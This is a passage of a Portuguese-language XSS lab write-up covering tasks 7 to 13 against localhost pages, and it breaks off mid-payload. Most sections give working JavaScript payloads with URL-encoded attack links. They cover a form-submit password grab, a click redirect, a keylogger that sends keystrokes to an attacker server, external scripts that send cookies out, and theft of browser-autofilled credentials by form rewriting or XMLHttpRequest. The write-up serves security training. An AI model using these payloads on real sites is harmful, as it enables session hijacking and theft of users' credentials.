	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">onsubmit</span> <span class="o">=</span> <span class="kd">function</span> <span class="nf">demo</span> <span class="p">()</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="nf">alert</span><span class="p">(</span><span class="nx">pass</span><span class="p">);</span>
	<span class="p">}</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&amp;password=">http://localhost/07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&amp;password=</a></ul><p>Com isso, o código HTML foi alterado e o script injetado no <em>event listener</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-21.png" alt="Event listener" /></p><p>Desta forma, quando o usuário submeter o formulário com usuário e senha, o alerta será impresso com a senha.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-22.png" alt="Resultado" /></p><h4 id="referências-6">Referências</h4><ul><li><a href="https://aws.amazon.com/pt/what-is/event-listener/">https://aws.amazon.com/pt/what-is/event-listener/</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes">https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes</a></ul><h3 id="task-8---redirect-on-click"><em>Task 8 - Redirect on Click</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-23.png" alt="Task 8" /></p><h4 id="objetivo-8">Objetivo</h4><p>O objetivo desta <em>task</em> é redirecionar o usuário para qualquer outro lugar, sempre que ele efetuar qualquer clique dentro da página.</p><h4 id="conhecimento-base-7">Conhecimento Base</h4><p>Conforme explorado anteriormente, os <em>event listeners</em> são funções chamadas em resposta a um evento específico que ocorre em um elemento. Existem uma infinidade de <em>event listeners</em> que podem ser utilizados em vários contextos diferentes.</p><p>Com uso de JavaScript, é possível criar <em>event listeners</em> atrelados a qualquer elemento HTML com o método <code class="language-plaintext highlighter-rouge">addEventListener()</code>.</p><h4 id="exploração-7">Exploração</h4><p>É possível criar uma função de redirecionamento, e atrelar um <em>event listener</em> ao próprio <code class="language-plaintext highlighter-rouge">body</code> do documento.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">function</span> <span class="nf">CaughtClick</span><span class="p">()</span> <span class="p">{</span>
		<span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://h41stur.com</span><span class="dl">"</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">click</span><span class="dl">'</span><span class="p">,</span> <span class="nx">CaughtClick</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E">http://localhost/08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E</a></ul><p>Ao acessar a URL, qualquer clique dentro da página levará ao redirecionamento.</p><h4 id="referências-7">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener">https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener</a><h3 id="task-9---javascript-keylogger"><em>Task 9 - JavaScript Keylogger</em></h3></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-24.png" alt="Task 9" /></p><h4 id="objetivo-9">Objetivo</h4><p>O objetivo desta <em>task</em> é criar um <em>key logger</em> que irá capturar todas as teclas digitadas por um invasor dentro da página, e enviá-las para a máquina sob controle do atacante.</p><h4 id="conhecimento-base-8">Conhecimento Base</h4><p>Os atributos globais de manipulador de evento (<em>event handler</em>) em HTML são atributos que podem ser adicionados a qualquer elemento HTML para definir o comportamento de um elemento quando um evento específico ocorre. Por exemplo, você pode usar um manipulador de eventos para definir o que acontece quando um usuário clica em um elemento, passa o mouse sobre um elemento, pressiona uma tecla do teclado quando um elemento tem foco, e muito mais.</p><p>Alguns exemplos de manipuladores de eventos globais são:</p><ul><li><code class="language-plaintext highlighter-rouge">onkeypress</code>: Este manipulador é acionado quando um usuário pressiona uma tecla e depois a solta.<li><code class="language-plaintext highlighter-rouge">onclick</code>: Este manipulador é acionado quando um usuário clica em um elemento.<li><code class="language-plaintext highlighter-rouge">ondblclick</code>: Este manipulador é acionado quando um usuário clica duas vezes em um elemento.<li><code class="language-plaintext highlighter-rouge">onmouseover</code>: Este manipulador é acionado quando um usuário move o cursor do mouse sobre um elemento.<li><code class="language-plaintext highlighter-rouge">onmouseout</code>: Este manipulador é acionado quando um usuário move o cursor do mouse para fora de um elemento.<li><code class="language-plaintext highlighter-rouge">onkeydown</code>: Este manipulador é acionado quando um usuário pressiona uma tecla do teclado.<li><code class="language-plaintext highlighter-rouge">onload</code>: Este manipulador é acionado quando um elemento, como uma imagem ou um script, terminou de carregar.</ul><p>Cada um desses manipuladores de eventos pode ser usado para chamar uma função JavaScript que define o que acontece quando o evento ocorre.</p><p>A única diferença entre um atributo <em>event handler</em> e um <em>event listener</em> é que os <em>event handlers</em> são uma maneira mais antiga e menos flexível de responder a eventos, pois são inseridos de forma estática diretamente no HTML, enquanto os <em>event listeners</em> oferecem mais controle e permitem múltiplas funções de <em>callback</em> para o mesmo evento no mesmo elemento.</p><p>Eventos que capturam teclas pressionadas, geralmente armazenam este <em>buffer</em> em <strong>UTF-16</strong>, para que estes caracteres sejam transformados em uma <em>string</em>, pode-se utilizar o método estático <code class="language-plaintext highlighter-rouge">String.fromCharCode()</code>.</p><h4 id="exploração-8">Exploração</h4><p>Para montar este ataque, podemos utilizar o <em>event handler</em> <code class="language-plaintext highlighter-rouge">onkeypress</code> para enviar a tecla pressionada para uma função, que por sua vez vai transformar em uma <em>string</em> e enviar via requisição utilizando o <em>constructor</em> <code class="language-plaintext highlighter-rouge">Image()</code> para a máquina sob controle do atacante.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span> <span class="o">=</span> <span class="kd">function</span> <span class="nf">KeyLogger</span><span class="p">(</span><span class="nx">inp</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">key_pressed</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">inp</span><span class="p">.</span><span class="nx">which</span><span class="p">);</span>
		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?</span><span class="dl">"</span><span class="o">+</span><span class="nx">key_pressed</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/09/?search=%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E">http://localhost/09/?search=%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurada para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-13.png" alt="Servidor Python ouvindo" /></p><p>Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, a cada tecla pressionada, uma requisição será feita para <em>Python server</em> contendo seu valor.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-25.png" alt="Resultado" /></p><h4 id="referências-8">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes">https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode</a></ul><h3 id="task-10---invoking-external-js"><em>Task 10 - Invoking External JS</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-26.png" alt="Task 10" /></p><h4 id="objetivo-10">Objetivo</h4><p>O objetivo desta <em>task</em> é criar invocar um script JavaScript externo que por sua vez vai imprimir um alerta com o <em>cookie</em> do usuário, e, em seguida, enviar este <em>cookie</em> para a máquina sob controle do atacante.</p><h4 id="conhecimento-base-9">Conhecimento Base</h4><p>O elemento HTML <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> é usado para incorporar código ou dados executáveis; isso é normalmente usado para incorporar ou referir-se ao código JavaScript.</p><h4 id="exploração-9">Exploração</h4><p>Esta exploração se da em duas fases, a primeira consiste em montar um script malicioso e hospedá-lo na máquina sob controle do atacante que será usada como <em>dropper</em>, em seguida montamos um script que será injetado no vetor de XSS.</p><p><strong>Script malicioso:</strong></p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
    <span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="p">});</span>
</pre></table></code></div></div><p><strong>Script a ser injetado</strong></p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://0.0.0.0:8080/script.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/10/?search=%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E">http://localhost/10/?search=%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 que hospeda o script malicioso e configurado para ouvir as requisições feitas.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-27.png" alt="Python server" /></p><p>Ao acessar a URL, um alerta é impresso com o <em>cookie</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-28.png" alt="Alerta com o cookie" /></p><p>E logo em seguida este <em>cookie</em> é enviado para a máquina do atacante. Perceba as duas requisições efetuadas pela vítima.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-29.png" alt="Resolução" /></p><h4 id="referências-9">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script</a></ul><h3 id="task-11---invoking-external-js-using-js"><em>Task 11 - Invoking External JS Using JS</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-30.png" alt="Task 11" /></p><h4 id="objetivo-11">Objetivo</h4><p>O objetivo desta <em>task</em>, assim como a anterior, é criar invocar um script JavaScript externo que por sua vez vai imprimir um alerta com o <em>cookie</em> do usuário, porém, desta vez, a importação deste script deve ser feito com JavaScript.</p><h4 id="conhecimento-base-10">Conhecimento Base</h4><p>Já vimos anteriormente que o método <code class="language-plaintext highlighter-rouge">createElement()</code> nos possibilita criar qualquer elemento HTML em um documento.</p><p>Também vimos que o método <code class="language-plaintext highlighter-rouge">appendChild()</code> nos permite criar um nó filho no DOM com base em um nó pai.</p><h4 id="exploração-10">Exploração</h4><p>Seguindo o raciocínio do que já vimos, podemos criar um novo elemento do tipo <code class="language-plaintext highlighter-rouge">script</code> usando JavaScript e anexá-lo ao documento com o método <code class="language-plaintext highlighter-rouge">appendChild()</code>. Este novo elemento pode importar nosso script malicioso para a página alvo.</p><p><strong>Script malicioso:</strong></p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
    <span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="p">});</span>
</pre></table></code></div></div><p><strong>Script a ser injetado</strong></p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">newtag</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
	<span class="nx">newtag</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">newtag</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/script.js</span><span class="dl">"</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">newtag</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/11/?search=%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E">http://localhost/11/?search=%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 que hospeda o script malicioso e configurado para ouvir as requisições feitas.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-27.png" alt="Python server" /></p><p>Ao acessar a URL, um alerta é impresso com o <em>cookie</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-28.png" alt="Alerta com o cookie" /></p><p>E logo em seguida este <em>cookie</em> é enviado para a máquina do atacante. Perceba as duas requisições efetuadas pela vítima.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-29.png" alt="Resolução" /></p><h4 id="referências-10">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement">https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild">https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild</a></ul><h3 id="task-12---stealing-information-from-auto-complete-fields"><em>Task 12 - Stealing Information from Auto-Complete Fields</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-31.png" alt="Task 12" /></p><h4 id="objetivo-12">Objetivo</h4><p>Um comportamento normal de várias aplicações, é permitir que um usuário salve as credenciais no cofre do navegador, para serem autopreenchidas ao visitar a tela de login.</p><p>Este comportamento, por si só, não é vulnerável, porém se esta página de login é vulnerável a XSS, isto pode ser um problema.</p><p>O objetivo desta <em>task</em>, é roubar os dados autopreenchidos pela função de armazenar credenciais ativa pela aplicação.</p><h4 id="conhecimento-base-11">Conhecimento Base</h4><p>Sabendo que pode haver um intervalo, mesmo que seja quase imperceptível entre o carregamento da página, e o carregamento das credenciais salvas no navegador, não podemos inserir um script de ação imediata. É preciso de um tempo de espera, que também não pode ser alto, pois permitirá que o usuário faça alguma ação que impossibilite o ataque.</p><p>Pensando nesse intervalo de tempo, podemos utilizar a função global <code class="language-plaintext highlighter-rouge">setTimeout()</code> que cria um <em>timer</em> em milissegundos que executa uma função ou pedaço de código quando o tempo expira.</p><p>Neste caso, podemos criar uma função que vai adulterar alguns atributos do formulário como o <code class="language-plaintext highlighter-rouge">action</code> e o <code class="language-plaintext highlighter-rouge">method</code>, além de inserir um <em>auto-submit</em> quando este <em>timer</em> expirar.</p><p>Em outras palavras, com um tempo seguro, podemos enviar as informações autopreenchidas para a máquina sob controle do atacante.</p><h4 id="exploração-11">Exploração</h4><p>Com o uso da função global <code class="language-plaintext highlighter-rouge">setTimeout()</code>, podemos executar uma função que irá adulterar o formulário e auto submetê-lo para nossa máquina.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="nb">window</span><span class="p">.</span><span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">action</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080</span><span class="dl">"</span><span class="p">;</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">method</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">;</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
	<span class="p">}</span> <span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/12/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E">http://localhost/12/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurado para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-32.png" alt="Python server" /></p><p>Ao carregar a página, as credenciais armazenadas são carregadas nos campos do formulário.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-33.png" alt="Formulário autopreenchido" /></p><p>Logo em seguida, os dados são encaminhados para o <em>Python server</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-34.png" alt="Dados recebidos" /></p><h4 id="referências-11">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/setTimeout">https://developer.mozilla.org/en-US/docs/Web/API/setTimeout</a></ul><h3 id="task-13---stealing-information-from-auto-complete-fields-with-xmlhttprequest"><em>Task 13 - Stealing Information from Auto-Complete Fields with XMLHttpRequest</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-35.png" alt="Task 13" /></p><h4 id="objetivo-13">Objetivo</h4><p>O objetivo desta <em>task</em>, assim como a anterior, é roubar os dados autopreenchidos pela função de armazenar credenciais ativa pela aplicação, porém utilizando o <em>constructor</em> <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>.</p><h4 id="conhecimento-base-12">Conhecimento Base</h4><p><strong>AJAX</strong> (<em>Asynchronous JavaScript and XML</em>). É uma técnica de desenvolvimento que permite a criação de aplicações interativas. Com AJAX, um navegador pode enviar e receber dados de um servidor de forma assíncrona, sem interferir na exibição e no comportamento da página existente.</p><p>Entre as inúmeras implementações do AJAX, algumas interessantes são:</p><ul><li><strong>Atualizar uma página sem recarregá-la</strong>: com AJAX, você pode atualizar o conteúdo de uma página sem ter que recarregar a página inteira.<li><strong>Enviar dados para um servidor em segundo plano</strong>: com AJAX, você pode enviar dados para um servidor e receber uma resposta sem recarregar a página.<li><strong>Recuperar dados de um servidor e atualizar a página</strong>: com AJAX, você pode recuperar dados de um servidor e usar esses dados para atualizar a página.</ul><p>O <em>core</em> do AJAX é o <em>constructor</em> <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>, um objeto incorporado nos navegadores que fornece funcionalidades para buscar dados de um servidor de forma assíncrona, sem precisar interromper a interação do usuário com a página atual. Ele é a base para qualquer tipo de interação AJAX no navegador.</p><p>Embora o nome sugira que ele é usado para buscar apenas dados XML, na prática, ele pode ser usado para buscar qualquer tipo de dados, incluindo texto simples, JSON, e até mesmo arquivos binários.</p><h4 id="exploração-12">Exploração</h4><p>Assim com a <em>task</em> anterior, é necessário um tempo mínimo de espera para que o script malicioso entra em ação, portanto ainda precisamos do <code class="language-plaintext highlighter-rouge">setTimeout()</code>.</p><p>Porém, o <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code> nos permitirá ser mais <em>stealth</em>, uma vez que suas requisições não redirecionam o navegador, e acontecem sem que o usuário perceba.</p><p>Desta vez, não será necessário submeter o formulário para a máquina sob controle do atacante, ao invés disso, podemos simplesmente capturar os valores dos campos de usuário e senha, e fazer o <em>request</em> de forma silenciosa.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="nb">window</span><span class="p">.</span><span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
